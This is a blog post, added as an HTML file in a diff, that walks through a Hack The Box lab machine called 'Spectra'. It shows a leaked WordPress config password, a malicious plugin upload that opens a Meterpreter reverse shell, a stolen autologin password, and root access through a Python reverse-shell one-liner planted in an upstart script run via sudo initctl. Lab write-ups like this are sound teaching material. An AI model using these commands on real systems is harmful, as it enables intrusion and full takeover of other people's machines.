@@ -1,0 +1,216 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Hackthebox Spectra // Itarow</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.68.3" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Itarow" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://itarow.github.io/css/main.min.93a6fb3f59f8b73cc421a59ee5368eba507d50e7ffacf0723c82b2d680307f27.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Hackthebox Spectra"/>
+<meta name="twitter:description" content="I rooted Spectra which was an Easy Other type machine. This box was cool, it implicates malicious plugin upload on WordPress, credentials find on “/etc/autologin/passwd” and sudo capabilities on “initctl”.
+Foothold So, classic nmap scan :
+➜ Spectra nmap -A -p- -T4 10.10.10.229 Starting Nmap 7.70 ( https://nmap.org ) at 2021-03-29 09:11 CEST Nmap scan report for 10.10.10.229 Host is up (0.073s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8."/>
+
+    <meta property="og:title" content="Hackthebox Spectra" />
+<meta property="og:description" content="I rooted Spectra which was an Easy Other type machine. This box was cool, it implicates malicious plugin upload on WordPress, credentials find on “/etc/autologin/passwd” and sudo capabilities on “initctl”.
+Foothold So, classic nmap scan :
+➜ Spectra nmap -A -p- -T4 10.10.10.229 Starting Nmap 7.70 ( https://nmap.org ) at 2021-03-29 09:11 CEST Nmap scan report for 10.10.10.229 Host is up (0.073s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://itarow.github.io/posts/hackthebox-spectra/" />
+<meta property="article:published_time" content="2021-06-25T16:15:25+02:00" />
+<meta property="article:modified_time" content="2021-06-25T16:15:25+02:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://itarow.github.io"><img class="app-header-avatar" src="/avatar.jpg" alt="Itarow" /></a>
+      <h1>Itarow</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/home/Itarow</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags">/tags</a>
+      </nav>
+      <p>CS student, wrtiting some write up of cool CTF&#39;s challenges and box</p>
+      <div class="app-header-social">
+        
+          <a href="https://www.root-me.org/Itarow" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-flag">
+  <title>Root-me</title>
+  <path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"></path><line x1="4" y1="22" x2="4" y2="15"></line>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com/0xItarow" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://github.com/itarow" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://app.hackthebox.eu/profile/409940" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-terminal">
+  <title>HackTheBox</title>
+  <polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Hackthebox Spectra</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jun 25, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          3 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://itarow.github.io/tags/hackthebox/">HackTheBox</a>
+              <a class="tag" href="https://itarow.github.io/tags/write-up/">Write-up</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>I rooted Spectra which was an Easy Other type machine. This box was cool, it implicates malicious plugin upload on WordPress, credentials find on “/etc/autologin/passwd” and sudo capabilities on “initctl”.</p>
+<h2 id="foothold">Foothold</h2>
+<p>So, classic nmap scan :</p>
+<pre><code>➜ Spectra nmap -A -p- -T4 10.10.10.229
+
+Starting Nmap 7.70 ( https://nmap.org ) at 2021-03-29 09:11 CEST
+Nmap scan report for 10.10.10.229
+Host is up (0.073s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
+| ssh-hostkey:
+|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
+80/tcp   open  http    nginx 1.17.4
+|_http-server-header: nginx/1.17.4
+|_http-title: Site doesn t have a title (text/html).
+3306/tcp open  mysql   MySQL (unauthorized)
+</code></pre><p>So we are gonna looking at port 80, the web port.</p>
+<p><img src="../img/spectra/img1.png" alt=""></p>
+<p>Interesting page, with a testing part.
+We need to change our /etc/hosts with spectra.htb.</p>
+<p><img src="../img/spectra/img2.png" alt=""></p>
+<p>We see WordPress files, but many errors when we want to look at them. After few enumerations we found a file called -&gt; wp-config.php.save we checked the source code and :</p>
+<p><img src="../img/spectra/img3.png" alt=""></p>
+<p>We found DB creds, we try to connect with the SQL port but impossible. So we turn on the main WordPress page :</p>
+<p><img src="../img/spectra/img4.png" alt=""></p>
+<p>We tried to log in as administrator:devteam01 (which was the password that we found), and yup, we’re log in.
+Now, classic method when you are administrator on a WordPress website -&gt; malicious plugin upload.
+We’re going to use <a href="https://github.com/wetw0rk/malicious-wordpress-plugin">https://github.com/wetw0rk/malicious-wordpress-plugin</a>
+We just have to run :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ python wordpwn.py 10.10.14.193 <span style="color:#ae81ff">8888</span> Y
+resource <span style="color:#f92672">(</span>wordpress.rc<span style="color:#f92672">)</span>&gt; set LHOST 10.10.14.193
+LHOST <span style="color:#f92672">=</span>&gt; 10.10.14.193
+resource <span style="color:#f92672">(</span>wordpress.rc<span style="color:#f92672">)</span>&gt; set LPORT <span style="color:#ae81ff">8888</span>
+LPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">8888</span>
+resource <span style="color:#f92672">(</span>wordpress.rc<span style="color:#f92672">)</span>&gt; exploit
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.14.193:8888
+</code></pre></div><p>Upload the .zip that the script create on the plugin page, activate it, and ping <a href="http://spectra.htb/main//wp-content/plugins/malicious/wetw0rk_maybe.php">http://spectra.htb/main//wp-content/plugins/malicious/wetw0rk_maybe.php</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">39282</span> bytes<span style="color:#f92672">)</span> to 10.10.10.229
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.10.14.193:8888 -&gt; 10.10.10.229:34222<span style="color:#f92672">)</span> at 2021-03-29 22:41:31 +0200
+
+meterpreter &gt; shell
+Process <span style="color:#ae81ff">6532</span> created.
+Channel <span style="color:#ae81ff">0</span> created.
+python -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
+$
+</code></pre></div><p>We have a shell é_é
+We just have to run the script to enumerate a box -&gt; linpeas.sh (<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a>)
+And the script found :</p>
+<pre><code>/etc/autologin/passwd
+-rw-r--r-- 1 root root 19 Feb  3 16:43 /etc/autologin/passwd
+SummerHereWeCome!!
+</code></pre><p>We tried to connect in ssh with the user katie and this password :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">➜ Spectra ssh katie@10.10.10.229
+katie@spectra ~ $ id
+uid<span style="color:#f92672">=</span>20156<span style="color:#f92672">(</span>katie<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>20157<span style="color:#f92672">(</span>katie<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>20157<span style="color:#f92672">(</span>katie<span style="color:#f92672">)</span>,20158<span style="color:#f92672">(</span>developers<span style="color:#f92672">)</span>
+</code></pre></div><p>Yess, we’re log in. We move into the root part.</p>
+<h2 id="root-part">Root part</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">katie@spectra ~ $ sudo -l
+User katie may run the following commands on spectra:
+    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> SETENV: NOPASSWD: /sbin/initctl
+</code></pre></div><p>So yep, we could exploit this binary to execute a command with root rights.</p>
+<p>After few searches, we found an interesting path, linked with initctl -&gt; <code>/etc/init</code></p>
+<p>Those many scripts are launched with initctl.</p>
+<p>We found many scripts where we could write on them. So now, game over, we just have to put a reverse shell command in one of the scripts, and run the script with <code>sudo initcl scriptname</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">description <span style="color:#e6db74">&#34;Test node.js server&#34;</span>
+author      <span style="color:#e6db74">&#34;katie&#34;</span>
+
+start on filesystem or runlevel <span style="color:#f92672">[</span>2345<span style="color:#f92672">]</span>
+stop on shutdown
+
+script
+
+    export HOME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/srv&#34;</span>
+    echo $$ &gt; /var/run/nodetest.pid
+    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
+
+end script
+
+pre-start script
+	python -c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.193&#34;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
+    echo <span style="color:#e6db74">&#34;[`date`] Node Test Starting&#34;</span> &gt;&gt; /var/log/nodetest.log
+end script
+
+pre-stop script
+    rm /var/run/nodetest.pid
+    echo <span style="color:#e6db74">&#34;[`date`] Node Test Stopping&#34;</span> &gt;&gt; /var/log/nodetest.log
+end script
+</code></pre></div><p>Like you could see, we put a reverse shell command in python in the pre-startpart:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">python -c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.193&#34;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
+</code></pre></div><p>To finish :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># on the box : (test is the script name)</span>
+-bash-4.3$ sudo initctl start test
+test start/running, process <span style="color:#ae81ff">51967</span>
+</code></pre></div><p>Netcat listening on port 8888 (specified port in the python command) on our machine</p>
+<pre><code>nc -lvnp 8888
+Connection from 10.10.10.229:45612
+# whoami &amp; id
+uid=0(root) gid=0(root) groups=0(root)
+# root
+</code></pre><p>Really enjoyed this box, because I had not yet had the opportunity to play with malicious WordPress plugin, and initctl command
+Hope you enjoyed this WU and see you soon :)</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
